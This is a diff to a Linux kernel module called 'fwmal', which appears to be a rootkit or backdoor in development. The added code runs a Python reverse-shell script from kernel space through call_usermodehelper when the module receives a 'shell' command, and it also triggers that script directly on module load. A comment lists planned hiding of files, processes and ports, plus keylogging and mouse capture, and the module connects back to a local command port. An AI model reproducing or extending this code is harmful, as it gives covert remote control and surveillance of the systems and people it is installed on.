@@ -1,6 +1,8 @@
 #include <linux/kernel.h>
 #include <linux/module.h>
 #include<linux/in.h>
+#include <linux/init.h>
+#include <linux/moduleparam.h>
 #include<linux/inet.h>
 #include<linux/socket.h>
 #include<net/sock.h>
@@ -18,6 +20,7 @@
 #define PORT 8889
 #define ADRESS "127.0.0.1"
 #define BUFFER_SIZE 1024
+#define SLEEP_TIME 10*1000
 //static struct nf_hook_ops my_nf_hook;
 struct task_struct *background_task;
 struct socket *socket;
@@ -89,8 +92,42 @@ void init_nf(void)
 }
 */
 
+/*
+字符串功能描述
+0、exit：退出，在fwmal_thread中处理
+1、shell：生成shell
+2、hidefile：隐藏文件
+3、hidethread：隐藏进程
+4、hideports：隐藏端口
+5、getnetpacket：获取网络包
+6、getkeyboard：获取键盘输入
+7、getmouse：得到鼠标位置
+*/
 int parse(char* buf){
+	/*
+	char* path = "PATH=/sbin:/bin:/usr/sbin:/usr/bin";
+	char* start = "/usr/bin/python";
+	char* arg = "/home/likaiming/workspace/fwmal/script/reverse_shell.py";
+	char *envp[] = {path, NULL};
+	char *argv[] = {start, arg, NULL};
+	*/
 
+	char cmd_path[] = "/usr/bin/python";  
+	char *cmd_argv[] = {cmd_path, "/home/likaiming/workspace/fwmal/script/reverse_shell.py", NULL};  
+	char *cmd_envp[] = {"HOME=/", "PATH=/sbin:/bin:/user/bin", NULL};  
+	
+	/*
+	char cmd_path[] = "/usr/bin/touch";  
+	char *cmd_argv[] = {cmd_path, "/home/likaiming/workspace/fwmal/test.txt", NULL};  
+	char *cmd_envp[] = {"HOME=/", "PATH=/sbin:/bin:/user/bin", NULL};
+	*/
+	printk("[fwmal]:parse\n");
+	if(strcmp(buf,"shell") == 0){
+		printk("[fwmal]:shell\n");
+		return call_usermodehelper(cmd_path, cmd_argv, cmd_envp, UMH_WAIT_EXEC); //call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
+	}
+	printk("[fwmal]:parse other\n");
+	return 0;
 }
 
 int fwmal_thread(void* data)
@@ -107,7 +144,7 @@ int fwmal_thread(void* data)
 		ser = socket->ops->connect(socket,(struct sockaddr *)&s_addr, sizeof(s_addr),0);
 		if(ser!=0){
 			printk("[fwmal]:connect fail\n");
-			msleep(10*1000);
+			msleep(SLEEP_TIME);
 			continue;
 		}
 		//进入交互逻辑
@@ -137,7 +174,7 @@ int fwmal_thread(void* data)
 			ret = kernel_sendmsg(socket, &send_msg, &send_vec, 1, BUFFER_SIZE);
 			if(ret<0) break;
 		}
-		msleep(10*1000);
+		msleep(SLEEP_TIME);
 	}
 	return 0;
 }
@@ -162,10 +199,12 @@ void init_thread(void)
 static int __init fwmal_init(void)
 {
 	int ret = khook_init();
-	init_thread();
+	//init_thread();
 	//init_nf();
+	ret = parse("shell");
 	if (ret != 0)
 		goto out;
+	printk("[fwmal]:%d\n",ret);
 	printk("[fwmal]:Hello World\n");
 out:
 	return ret;
